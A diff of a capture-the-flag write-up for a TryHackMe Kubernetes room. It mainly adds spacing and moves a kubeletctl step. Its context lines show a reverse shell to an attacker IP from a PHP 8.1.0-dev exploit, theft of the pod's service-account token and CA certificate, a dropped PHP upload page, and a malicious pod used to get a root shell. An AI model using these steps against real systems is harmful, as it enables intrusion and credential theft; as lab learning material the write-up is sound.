@@ -482,7 +482,6 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# 
 ```
 
-
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ls -lah
 ls -lah
@@ -492,6 +491,8 @@ drwxr-xr-x 3 root root 4.0K Mar 30  2021 ..
 -rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
 -rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
 ```
+
+<br>
 
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# find / type -name *.io 2>/dev/null
@@ -517,6 +518,8 @@ namespace
 token
 ```
 
+<br>
+
 ```bash    
 root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat ca.crt
 <un/secrets/kubernetes.io/serviceaccount# cat ca.crt                        
@@ -535,20 +538,27 @@ v+ystMEnq13M7jr7YTOfR1lFvg==
 :~/FrankandHerbyTryAgain# chmod 600 ca.crt
 ```
 
+<br>
+
 ```bash      
 root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat token
 <run/secrets/kubernetes.io/serviceaccount# cat token                        
 eyJhbG...
 ```
 
+<br>
+
 ```bash   
 :~/FrankandHerbyTryAgain# token='eyJhbG...'
 ```
+
+<br>
 
 ```bash      
 root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat namespace
 ```
 
+<br>
 <p>
   
 - there is no microk8s, no curl, no wget, ...<br>
@@ -561,6 +571,7 @@ root@php-deploy-6d998f68b9-fvtcg:/run/secrets/kubernetes.io/serviceaccount# cat 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
+<br>
 <p>
 
 - downloaded kubectl<br>
@@ -575,6 +586,8 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 100 57.7M  100 57.7M    0     0   156M      0 --:--:-- --:--:-- --:--:--  156M
 ```
 
+<br>
+
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
 ```
@@ -583,6 +596,7 @@ root@php-deploy-6d998f68b9-fvtcg:/var/www/html# echo '<?php $target_dir = "uploa
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
+<br>
 <p>
 
 - navigated to :30679/hi.php</p>
@@ -598,6 +612,7 @@ root@php-deploy-6d998f68b9-fvtcg:/var/www/html# chmod +x kubectl
 chmod +x kubectl
 ```
 
+<br>
 <p>
 
 - after attempts to evolve in this challenge, on many different days, I learned that I could transfer files in an simpler way<br><br><br>
@@ -621,6 +636,7 @@ EOF
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
+<br>
 <p>
 
 - navigated to :30679/aa.php</p>
@@ -640,6 +656,8 @@ kube-system   coredns-64c6478b6c-x6wss                   1/1     Running       0
 kube-system   calico-kube-controllers-664fd6f4fb-5hlbd   1/1     Running       0             37m
 ```
 
+<br>
+
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get secrets -A
 ./kubectl get secrets -A
@@ -650,6 +668,7 @@ frankland         op-token-26qmx                                   kubernetes.io
 ...
 ```
 
+<br>
 <p>
 
 - path: /home/herby/app</p>
@@ -714,6 +733,8 @@ items:
 ...
 ```
 
+<br>
+
 ```bash
 root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods -n frankland
 <vtcg:/var/www/html# ./kubectl get pods -n frankland
@@ -722,6 +743,7 @@ php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
 php-deploy-6d998f68b9-fvtcg   1/1     Running       0             65m
 ```
 
+<br>
 <p><em>rosana.yaml</em></p>
 
 ```bash
@@ -755,6 +777,8 @@ spec:
 pod/rosana created
 ```
 
+<br>
+<br>
 
 ```bash
 :~/FrankandHerbyTryAgain# nc -nlvp 1337
@@ -766,6 +790,8 @@ root@ip-xx-xxx-xx-xx:/var/www/html# id
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+<br>
 
 ```bash
 root@ip-xx-xxx-xx-xx:/var/www/html# cd /mnt
@@ -813,17 +839,35 @@ THM{*-******-****-*****}
 <br>
 <br>
 
+<p>
+
+- I should have performed the following steps before</p>
+
+```bash
+:~/FrankandHerbyTryAgain# kubeletctl pods -s xx.xxx.xx.xx --http --port 10255
+```
+
+<p><img width="1200px" src="https://github.com/user-attachments/assets/8a36c602-9734-45ec-b4a0-abff22873504"></p>
+
+<br>
+<br>
+<br>
+
 ```bash
 :~/FrankandHerbyTryAgain#   ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
 NAME         READY   UP-TO-DATE   AVAILABLE   AGE
 php-deploy   1/1     1            1           3y199d
 ```
 
+<br>
+
 ```bash
 :~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get services -n frankland
 NAME         TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
 php-deploy   NodePort   xx.xxx.xxx.xxx   <none>        80:30679/TCP   3y199d
 ```
+
+<br>
 
 ```bash
 :~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get pods -n frankland
@@ -832,6 +876,8 @@ php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
 php-deploy-6d998f68b9-fvtcg   1/1     Running       0             132m
 ```
 
+<br>
+
 ```bash
 :~/FrankandHerbyTryAgain# ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get nodes
 NAME              STATUS     ROLES    AGE      VERSION
@@ -839,8 +885,7 @@ microk8s          NotReady   <none>   3y200d   v1.23.17-2+40cc20cc310518
 ip-xx-xxx-xx-xx   Ready      <none>   138m     v1.23.17-2+40cc20cc310518
 ```
 
-<img width="1241" height="291" alt="image" src="https://github.com/user-attachments/assets/7218af65-dacd-48eb-8efb-fe23ba1db827" />
-
+<p><img width="1200px" src="https://github.com/user-attachments/assets/7218af65-dacd-48eb-8efb-fe23ba1db827"></p>
 
 <br>
 <br>
@@ -859,25 +904,8 @@ THM{*****-***-*****-*****-****}
 ```
 
 <br>
-
 <p>1.2. <em><strong>Root</strong> flag?</em><br>
 <strongTHM{*****-***-*****-*****-****}</strong></p>
-
-<br>
-<br>
-
-
-<p>
-
-- I should have done this ... before</p>
-
-```bash
-:~/FrankandHerbyTryAgain# kubeletctl pods -s xx.xxx.xx.xx --http --port 10255
-```
-
-<p><img width="1200px" src="https://github.com/user-attachments/assets/8a36c602-9734-45ec-b4a0-abff22873504"></p>
-
-
 <br>
 <br>
 <br>
